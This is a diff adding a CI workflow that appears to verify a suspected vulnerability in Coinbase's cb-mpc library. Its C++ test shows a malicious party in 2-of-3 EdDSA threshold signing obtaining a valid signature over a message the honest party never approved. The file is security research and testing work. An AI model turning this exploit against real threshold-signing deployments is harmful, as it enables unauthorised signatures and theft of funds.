@@ -1,0 +1,147 @@
+name: CBMPC EdDSA AC 2of3 Attacker Receiver V40
+
+on:
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/cbmpc-eddsa-ac-2of3-attacker-receiver-v40.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  verdict:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 50
+    steps:
+      - name: Clone exact current cb-mpc HEAD
+        shell: bash
+        run: |
+          set -euo pipefail
+          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
+          cd cb-mpc
+          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
+          git submodule update --init --recursive >/dev/null 2>&1
+          echo "tested_commit=$(git rev-parse HEAD)"
+
+      - name: Add 2-of-3 public API authorization bypass PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          from pathlib import Path
+          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
+          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
+          PY
+          cat >> cb-mpc/tests/unit/api/test_eddsa_mp_ac.cpp <<'CPP'
+
+          #include <fstream>
+
+          TEST(ApiEdDSAMpAcAliasV40, TwoOfThreeMaliciousReceiverGetsUnapprovedSignature) {
+            constexpr int n = 3;
+            std::vector<std::shared_ptr<mpc_net_context_t>> peers;
+            peers.reserve(n);
+            for (int i = 0; i < n; ++i) peers.push_back(std::make_shared<mpc_net_context_t>(i));
+            for (const auto& p : peers) p->init_with_peers(peers);
+
+            std::vector<std::shared_ptr<local_api_transport_t>> transports;
+            transports.reserve(n);
+            for (const auto& p : peers) transports.push_back(std::make_shared<local_api_transport_t>(p));
+
+            std::vector<std::string> names = {"honest-p0", "malicious-p1", "offline-p2"};
+            std::vector<std::string_view> all_names = {names[0], names[1], names[2]};
+            const auto ac = coinbase::api::access_structure_t::Threshold(
+                2, {coinbase::api::access_structure_t::leaf(names[0]),
+                    coinbase::api::access_structure_t::leaf(names[1]),
+                    coinbase::api::access_structure_t::leaf(names[2])});
+
+            // Normal 2-of-3 DKG. p0 and p1 are a valid quorum; p2 still receives a share.
+            const std::vector<std::string_view> dkg_quorum = {names[0], names[1]};
+            std::vector<buf_t> keys(n), sids(n);
+            std::vector<error_t> rvs;
+            run_mp(peers, [&](int i) {
+              job_mp_t job{static_cast<party_idx_t>(i), all_names, *transports[static_cast<size_t>(i)]};
+              return coinbase::api::eddsa_mp::dkg_ac(job, curve_id::ed25519,
+                                                     sids[static_cast<size_t>(i)], ac, dkg_quorum,
+                                                     keys[static_cast<size_t>(i)]);
+            }, rvs);
+            for (auto rv : rvs) ASSERT_EQ(rv, SUCCESS);
+
+            buf_t pub;
+            ASSERT_EQ(coinbase::api::eddsa_mp::get_public_key_compressed(keys[0], pub), SUCCESS);
+            coinbase::crypto::ecc_point_t Q;
+            ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_ed25519, pub), SUCCESS);
+            const coinbase::crypto::ecc_pub_key_t verify_key(Q);
+
+            // Only p0 and p1 are online for signing; p2 is offline.
+            std::vector<std::shared_ptr<mpc_net_context_t>> sign_peers = {peers[0], peers[1]};
+            std::vector<std::shared_ptr<local_api_transport_t>> sign_transports = {transports[0], transports[1]};
+            const std::vector<std::string_view> online_names = {names[0], names[1]};
+
+            buf_t honest_msg(32);
+            for (int i = 0; i < 32; ++i) honest_msg[i] = static_cast<uint8_t>(0x51 + (i % 10));
+            const buf_t approved_message = honest_msg;
+            buf_t malicious_msg(32);
+            malicious_msg.bzero();
+            const buf_t attacker_message = malicious_msg;
+            buf_t attacker_sig;
+
+            run_mp(sign_peers, [&](int i) {
+              job_mp_t job{static_cast<party_idx_t>(i), online_names, *sign_transports[static_cast<size_t>(i)]};
+              if (i == 0) {
+                return coinbase::api::eddsa_mp::sign_ac(job, keys[0], ac, honest_msg,
+                                                        /*sig_receiver=*/1, honest_msg);
+              }
+              return coinbase::api::eddsa_mp::sign_ac(job, keys[1], ac, malicious_msg,
+                                                      /*sig_receiver=*/1, attacker_sig);
+            }, rvs);
+
+            const int all_success = (rvs.size() == 2 && rvs[0] == SUCCESS && rvs[1] == SUCCESS) ? 1 : 0;
+            const int attacker_received = (attacker_sig.size() == 64) ? 1 : 0;
+            const int verifies_attacker = attacker_received && verify_key.verify(attacker_message, attacker_sig) == SUCCESS ? 1 : 0;
+            const int verifies_approved = attacker_received && verify_key.verify(approved_message, attacker_sig) == SUCCESS ? 1 : 0;
+
+            std::ofstream out("/code/v40-verdict.txt", std::ios::trunc);
+            out << "commit=fdbb60346757271d5e0241f417e55dc8f289573c"
+                << " rvs=" << (rvs.size() > 0 ? rvs[0] : -999) << "," << (rvs.size() > 1 ? rvs[1] : -999)
+                << " threshold=2of3 online=2 offline=1"
+                << " all_success=" << all_success
+                << " attacker_received=" << attacker_received
+                << " verifies_attacker_zero=" << verifies_attacker
+                << " verifies_honest_approved=" << verifies_approved
+                << " attacker_sig_size=" << attacker_sig.size()
+                << " honest_output_size=" << honest_msg.size() << "\n";
+          }
+          CPP
+
+      - name: Build and run ASAN UBSAN threshold PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd cb-mpc
+          make image >/tmp/image-build.log 2>&1
+          set +e
+          timeout 40m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make sanitize filter=ApiEdDSAMpAcAliasV40.TwoOfThreeMaliciousReceiverGetsUnapprovedSignature' >/tmp/v40.log 2>&1
+          status=$?
+          set -e
+          echo "sanitize_exit=$status"
+          if [ -f v40-verdict.txt ]; then cat v40-verdict.txt; else echo 'verdict_missing=1'; fi
+          if grep -Eqi 'AddressSanitizer|runtime error:' /tmp/v40.log; then
+            echo 'V40_UNEXPECTED_SANITIZER_FINDING=1'
+            grep -Ein -C 8 'AddressSanitizer|runtime error:' /tmp/v40.log | head -n 120 || true
+            exit 2
+          fi
+          if [ "$status" -ne 0 ]; then
+            echo 'V40_TEST_OR_BUILD_FAILURE=1'
+            tail -n 160 /tmp/v40.log
+            exit 1
+          fi
+          success=$(sed -n 's/.*all_success=\([0-9][0-9]*\).*/\1/p' v40-verdict.txt)
+          recv=$(sed -n 's/.*attacker_received=\([0-9][0-9]*\).*/\1/p' v40-verdict.txt)
+          attacker=$(sed -n 's/.*verifies_attacker_zero=\([0-9][0-9]*\).*/\1/p' v40-verdict.txt)
+          honest=$(sed -n 's/.*verifies_honest_approved=\([0-9][0-9]*\).*/\1/p' v40-verdict.txt)
+          if [ "${success:-0}" -eq 1 ] && [ "${recv:-0}" -eq 1 ] && [ "${attacker:-0}" -eq 1 ] && [ "${honest:-1}" -eq 0 ]; then
+            echo 'EDDSA_2OF3_UNAUTHORIZED_SIGNATURE_TO_ATTACKER_CONFIRMED=1'
+            exit 2
+          fi
+          echo 'EDDSA_2OF3_UNAUTHORIZED_SIGNATURE_TO_ATTACKER_CONFIRMED=0'
